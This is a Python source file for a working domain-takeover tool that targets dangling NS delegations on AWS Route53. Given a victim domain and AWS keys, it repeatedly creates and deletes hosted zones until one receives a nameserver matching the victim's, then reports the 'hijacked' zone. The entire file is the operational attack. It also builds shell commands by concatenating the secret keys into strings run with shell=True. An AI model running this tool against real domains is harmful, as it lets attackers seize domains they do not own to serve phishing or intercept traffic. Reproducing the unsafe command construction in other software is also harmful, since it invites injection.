import route53
import sys
import time
import traceback
import dns.resolver
import subprocess
import json

accessKey=""
secretKey=""
victimDomain=""
targetNS=[]
nsRecord=0


class bcolors:
    TITLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    INFO = '\033[93m'
    OKRED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    UNDERLINE = '\033[4m'
    FGWHITE = '\033[37m'
    FAIL = '\033[95m'


def myPrint(text, type):
	if(type=="INFO"):
		print bcolors.INFO+text+bcolors.ENDC+"\n"
		return
	if(type=="INFO_WS"):
		print bcolors.INFO+text+bcolors.ENDC
		return
	if(type=="ERROR"):
		print bcolors.BGRED+bcolors.FGWHITE+bcolors.BOLD+text+bcolors.ENDC
		return
	if(type=="MESSAGE"):
		print bcolors.TITLE+bcolors.BOLD+text+bcolors.ENDC+"\n"
		return
	if(type=="INSECURE_WS"):
		print bcolors.OKRED+bcolors.BOLD+text+bcolors.ENDC
		return
	if(type=="OUTPUT"):
		print bcolors.OKBLUE+bcolors.BOLD+text+bcolors.ENDC+"\n"
		return
	if(type=="OUTPUT_WS"):
		print bcolors.OKBLUE+bcolors.BOLD+text+bcolors.ENDC
		return
	if(type=="SECURE"):
		print bcolors.OKGREEN+bcolors.BOLD+text+bcolors.ENDC

#python NSBrute.py -d domain -a accessKey -s secretKey -ns a,b,c,d


if (len(sys.argv)<7):
	myPrint("Please provide the required arguments to initiate scanning.", "ERROR")
	print ""
	myPrint("Usage: python NSTakeover.py -d domain -a accessKey -s secretKey","ERROR")
	myPrint("Please try again!!", "ERROR") 
	print ""
	exit(1);
if (sys.argv[1]=="-d" or sys.argv[1]=="--domain"):
	victimDomain=sys.argv[2]
if (sys.argv[3]=="-a" or sys.argv[3]=="--accessId"):
	accessKey=sys.argv[4]
if (sys.argv[5]=="-s" or sys.argv[5]=="--secretKey"):
	secretKey=sys.argv[6]
try:
	nsRecords = dns.resolver.query(victimDomain, 'NS')
except:
	myPrint("Unable to fetch NS records for "+victimDomain+"\nPlease check the domain name and try again.","ERROR")
	exit(1)
isInt= isinstance(nsRecords,int)
if isInt and nsRecords==0:
	myPrint("No NS records found for "+victimDomain+"\nPlease check the domain name and try again.","ERROR")
	exit(1)
for nameserver in nsRecords:
		targetNS.append(str(nameserver))

#strip leading and trailing spaces	
for index in range(len(targetNS)):
		targetNS[index]=targetNS[index].strip()
#strip trailing .
		targetNS[index]=targetNS[index].strip(".")

conn = route53.connect(
    aws_access_key_id=accessKey,
    aws_secret_access_key=secretKey,
)
#While modifying the script if something goes wrong and you accidently end up creating shit loads of Zones you might need this logic for automated deletion of zones
# i=0
# listOfZoneIDs=[""]
# for zoneId in listOfZoneIDs:
# 	zone=conn.get_hosted_zone_by_id(zoneId)
# 	zone.delete()
# 	print i
# 	i=i+1
created_zones = []
successful_zone = []
counter=0
try:

	while True:
		counter=counter+1
		myPrint("Iteration Count: "+str(counter),"INFO_WS")
		try: 
			new_zone=0
			new_zone, change_info = conn.create_hosted_zone(
		    victimDomain, comment='zaheck'
			)
			hosted_zone_id = new_zone.__dict__["id"]
			created_zones.append(hosted_zone_id)
			#Erroneous Condition
			if new_zone is None:
				continue
			nsAWS=new_zone.nameservers
			myPrint("Created a new zone with following NS: ","INFO_WS")
			myPrint("".join(nsAWS),"INFO_WS")
			intersection=set(nsAWS).intersection(set(targetNS))
			if(len(intersection)==0):
				myPrint("No common NS found, deleting new zone","ERROR")
				print ""
				new_zone.delete()
			else:
				myPrint("Successful attempt after "+str(counter)+" iterations.","SECURE")
				myPrint("Check your AWS account, the work is done!","SECURE")
				print "This is the hijacked Zone ID: " + str(hosted_zone_id)
				print "This is the zone you hijacked: " + str(intersection)
				successful_zone.append(hosted_zone_id)
				created_zones.remove(hosted_zone_id)
				print ""
				break
		except Exception as e:
			myPrint("Exceptional behaviour observed while creating the zone.", "ERROR")
			myPrint("Trying Again!","ERROR")
			if new_zone != 0:
				new_zone.delete()
			continue

except KeyboardInterrupt:	
	if len(created_zones) != 0:
		command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 list-hosted-zones"
		out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
		# out = subprocess.Popen(["AWS_ACCESS_KEY_ID="+accessKey, "AWS_SECRET_ACCESS_KEY="+secretKey, "aws", "route53", "list-hosted-zones"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
		stdout,stderr = out.communicate()
		print("This is stdout: " + str(stdout))
		print("This is stderr: " + str(stderr))
		json_data = None
		if stdout != 'false':
			print("Inside of IF1")
			json_data = json.loads(stdout)
		remaining_zones = []
		for zone in json_data["HostedZones"]:
			remaining_zones.append(str(zone["Id"].replace("/hostedzone/","")))

		if len(successful_zone) != 0:
			remaining_zones.remove(successful_zone[0])

		for zone in remaining_zones:
			command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 delete-hosted-zone --id " + str(zone)
			# out = subprocess.Popen(["AWS_ACCESS_KEY_ID="+accessKey, "AWS_SECRET_ACCESS_KEY="+secretKey, "aws", "route53", "delete-hosted-zone", "--id " + zone], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
			print("This is the command I am about to run: " + str(command))
			out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
			stdout,stderr = out.communicate()
			print("This is stdout: " + str(stdout))
			print("This is stderr: " + str(stderr))

	else:
		exit()

command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 list-hosted-zones"
out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
# out = subprocess.Popen(["AWS_ACCESS_KEY_ID="+accessKey, "AWS_SECRET_ACCESS_KEY="+secretKey, "aws", "route53", "list-hosted-zones"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
stdout,stderr = out.communicate()
print("This is stdout: " + str(stdout))
print("This is stderr: " + str(stderr))
json_data = None
if stdout != 'false':
	print("Inside of IF2")
	json_data = json.loads(stdout)
remaining_zones = []
for zone in json_data["HostedZones"]:
	remaining_zones.append(str(zone["Id"].replace("/hostedzone/","")))

if len(successful_zone) != 0:
	remaining_zones.remove(successful_zone[0])

for zone in remaining_zones:
	command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 delete-hosted-zone --id " + str(zone)
	# out = subprocess.Popen(["AWS_ACCESS_KEY_ID="+accessKey, "AWS_SECRET_ACCESS_KEY="+secretKey, "aws", "route53", "delete-hosted-zone", "--id " + zone], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	print("This is the command I am about to run: " + str(command))
	out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
	stdout,stderr = out.communicate()
	print("This is stdout: " + str(stdout))
	print("This is stderr: " + str(stderr))